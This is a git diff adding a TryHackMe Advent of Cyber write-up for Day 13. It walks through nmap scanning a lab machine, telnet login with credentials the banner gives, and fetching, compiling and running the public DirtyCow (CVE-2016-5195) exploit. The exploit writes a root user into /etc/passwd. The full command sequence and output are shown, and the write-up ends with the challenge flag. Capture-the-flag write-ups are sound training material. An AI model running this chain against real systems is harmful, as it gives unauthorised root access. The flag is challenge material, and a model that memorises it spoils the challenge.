@@ -18,7 +18,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] [Day 10 - Don't be Elfish!](#day-10-dont-be-elfish)
 - [x] [Day 11 - The Rogue Gnome](#day-11-the-rogue-gnome)
 - [x] [Day 12 - Ready, set, elf.](#day-12-ready-set-elf)
-- [ ] Day 13 - Coal for Christmas
+- [x] [Day 13 - Coal for Christmas](#day13-coal-for-christmas)
 - [ ] Day 14 - Where's Rudolph?
 - [ ] Day 15 - There's a Python in my stocking!
 - [ ] Day 16 - Help! Where is Santa?
@@ -934,7 +934,7 @@ Examples include:
 Before we begin, we ping the machine:
 
 ```
-mshen@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day12-ready-set-elf$ ping 10.10.143.182
 PING 10.10.143.182 (10.10.143.182) 56(84) bytes of data.
 ^C
 --- 10.10.143.182 ping statistics ---
@@ -1180,3 +1180,285 @@ Server username: NT AUTHORITY\SYSTEM
 (note: since this is a windows box, `NT AUTHORITY\SYSTEM == root`)
 
 Although, I assume there is another flag2.txt or something on this box, unfortunately, I was not able to find it...
+
+## Day 13: Coal for Christmas
+
+*Category: Special*
+*Tags: DirtyCow, Privilege Escalation*
+
+> Kris Kringle checked his Naughty or Nice List, and he saw that more than a few sysadmins were on the naughty list! He went down the chimney and found old, outdated software, deprecated technologies and a whole environment that was so dirty! Take a look at this server and help prove that this house really deserves coal for Christmas!
+
+IP: `10.10.49.209`
+
+### Basic enumeration
+
+We start off with a basic Nmap scan
+
+```sh
+nmap -sC -sV -oN nmap.log 10.10.49.209
+```
+
+We get the following output:
+```log
+# Nmap 7.80 scan initiated Sun Dec 13 13:35:26 2020 as: nmap -sC -sV -oN nmap.log 10.10.49.209
+Nmap scan report for 10.10.49.209
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
+|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
+|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
+23/tcp  open  telnet  Linux telnetd
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          43633/udp6  status
+|   100024  1          50615/tcp6  status
+|   100024  1          52966/udp   status
+|_  100024  1          58940/tcp   status
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Dec 13 13:35:53 2020 -- 1 IP address (1 host up) scanned in 27.48 seconds
+```
+
+#### What old, deprecated protocol and service is running?
+
+We can see `telnet` running on port 23. Telnet is the predecessor to SSH. However, unlike SSH, it is unencrypted which means that `stdin` and `stdout` are sent in clear text.
+
+### Getting a shell
+
+We can use telnet to get a shell
+
+```
+telnet 10.10.49.209 23
+```
+
+Once we attempt to connect, it gives us a username and password!
+
+```
+Trying 10.10.49.209...
+Connected to 10.10.49.209.
+Escape character is '^]'.
+HI SANTA!!! 
+
+We knew you were coming and we wanted to make
+it easy to drop off presents, so we created
+an account for you to use.
+
+Username: santa
+Password: clauschristmas
+
+We left you cookies and milk!
+```
+
+Credentials: `santa:clauschristmas`
+
+If we log in with these credentials, we get shell!
+
+```
+Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2
+                \ / 
+              -->*<-- 
+                /o\ 
+               /_\_\ 
+              /_/_0_\ 
+             /_o_\_\_\ 
+            /_/_/_/_/o\ 
+           /@\_\_\@\_\_\ 
+          /_/_/O/_/_/_/_\ 
+         /_\_\_\_\_\o\_\_\ 
+        /_/0/_/_/_0_/_/@/_\ 
+       /_\_\_\_\_\_\_\_\_\_\ 
+      /_/o/_/_/@/_/_/o/_/0/_\ 
+               [___] 
+   
+$ whoami
+santa
+```
+
+### More enumeration
+
+As suggested, we read `/etc/*release` and run `uname -a` to find info about the system.
+
+```
+$ cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
+$ uname -a
+Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+As we can see, this machine is running `Ubuntu 12.04`.
+
+### Poking around the filesystem
+
+First, let's list the files in the current working directory (Santa's home directory)
+
+```
+$ ls -al
+total 20
+drwxr-xr-x 3 santa santa 4096 Nov 21 20:37 .
+drwxr-xr-x 3 root  root  4096 Nov 21 20:37 ..
+drwx------ 2 santa santa 4096 Nov 21 20:37 .cache
+-rwxr-xr-x 1 santa santa 1422 Nov 21 20:37 christmas.sh
+-rw-r--r-- 1 santa santa 2925 Nov 21 20:37 cookies_and_milk.txt
+```
+
+Let's read some of these file! Since the files were very long, I have put them into the day13-coal-for-christmas directory.
+
+Unfortunately, it the `grinch` seems to have gotten to the cookies and milk first.
+
+### DirtyCOW (CVE-2016-5195)
+
+Since this a relatively old version of Ubuntu that has passed the end of service, there could be a vulnerable Linux kernel exploit.
+
+| Version      | Code Name        | Release    | End of life |
+|--------------|------------------|------------|-------------|
+| Ubuntu 20.04 | Focal Fossa      | April 2020 | TBA         |
+| Ubuntu 18.04 | Bionic Beaver    | April 2018 | April 2028  |
+| Ubuntu 16.04 | Xenial Xerus     | April 2016 | April 2024  |
+| Ubuntu 14.04 | Trusty Tahr      | April 2014 | April 2022  |
+| Ubuntu 12.04 | Precise Pangolin | April 2012 | April 2017  |
+
+The dossier writes:
+
+>That C source code is a portion of a kernel exploit called DirtyCow. Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.  
+
+>This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!
+
+So, I found [`dirty.c`](https://github.com/FireFart/dirtycow/blob/master/dirty.c) on GitHub from FireFart. I used wget to [download](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c) it from GitHub. Then I set up an http-server* for file transfer.
+
+*I prefer using http-server since it a shorter command and it automatically reminds me of the IP and port on start. You could also use netcat or Python HTTP server as suggested.
+
+```
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ wget "https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c"
+--2020-12-13 14:14:26--  https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.124.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.124.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4815 (4.7K) [text/plain]
+Saving to: ‘dirty.c’
+
+dirty.c                     100%[========================================>]   4.70K  --.-KB/s    in 0s      
+
+2020-12-13 14:14:26 (38.1 MB/s) - ‘dirty.c’ saved [4815/4815]
+
+bluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ http-server
+Starting up http-server, serving ./
+Available on:
+  http://127.0.0.1:8080
+  http://172.16.57.163:8080
+  http://10.6.23.34:8080
+Hit CTRL-C to stop the server
+[Sun Dec 13 2020 14:17:03 GMT-0500 (Eastern Standard Time)]  "GET /dirty.c" "Wget/1.13.4 (linux-gnu)"
+^Chttp-server stopped.
+```
+
+Then on the victim box, I can simply use wget to pull the file over.
+
+```
+$ wget 10.6.23.34:8080/dirty.c
+--2020-12-13 19:17:03--  http://10.6.23.34:8080/dirty.c
+Connecting to 10.6.23.34:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4815 (4.7K) [text/x-c]
+Saving to: `dirty.c'
+
+100%[===================================================================>] 4,815       --.-K/s   in 0.001s  
+
+2020-12-13 19:17:03 (4.99 MB/s) - `dirty.c' saved [4815/4815]
+```
+
+As suggested by the comments in the source code of dirty.c, we can compile it with gcc and then run it.
+
+```sh
+gcc -pthread dirty.c -o dirty -lcrypt
+```
+
+```./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fi.zNBXcdv/Sk:0:0:pwned:/root:/bin/bash
+
+mmap: 7fc44dd38000
+```
+
+We have now created a user with root privileges called `firefart` with a password of out choosing. We can then switch also switch to this user.
+
+```
+$ su firefart
+Password: 
+firefart@christmas:/home/santa#
+```
+
+Now let's check out our home directory (aka `/root`).
+
+```
+firefart@christmas:~# cd ~/
+firefart@christmas:~# pwd
+/root
+firefart@christmas:~# ll
+total 24
+drwx------  2 firefart root 4096 Nov 21 20:38 ./
+drwxr-xr-x 24 firefart root 4096 Nov 21 20:38 ../
+-rw-------  1 firefart root    0 Nov 21 20:38 .bash_history
+-rw-r--r--  1 firefart root 3106 Apr 19  2012 .bashrc
+-rwxr-xr-x  1 firefart root 1422 Nov 21 20:37 christmas.sh*
+-rw-r--r--  1 firefart root  611 Nov 21 20:37 message_from_the_grinch.txt
+-rw-r--r--  1 firefart root  140 Apr 19  2012 .profile
+```
+
+### Getting the flag
+
+Let's read the `message_from_the_grinch.txt`...
+
+```
+Nice work, Santa!
+
+Wow, this house sure was DIRTY!
+I think they deserve coal for Christmas, don't you?
+So let's leave some coal under the Christmas `tree`!
+
+Let's work together on this. Leave this text file here,
+and leave the christmas.sh script here too...
+but, create a file named `coal` in this directory!
+Then, inside this directory, pipe the output
+of the `tree` command into the `md5sum` command.
+
+The output of that command (the hash itself) is
+the flag you can submit to complete this task
+for the Advent of Cyber!
+
+        - Yours,
+                John Hammond
+                er, sorry, I mean, the Grinch
+
+          - THE GRINCH, SERIOUSLY
+```
+
+Ok then, I guess I'll do what he say...
+
+```
+firefart@christmas:~# touch coal
+firefart@christmas:~# tree
+.
+|-- christmas.sh
+|-- coal
+`-- message_from_the_grinch.txt
+
+0 directories, 3 files
+firefart@christmas:~# tree | md5sum
+8b16f00dd3b51efadb02c1df7f8427cc
+```
+
+Flag: `8b16f00dd3b51efadb02c1df7f8427cc`
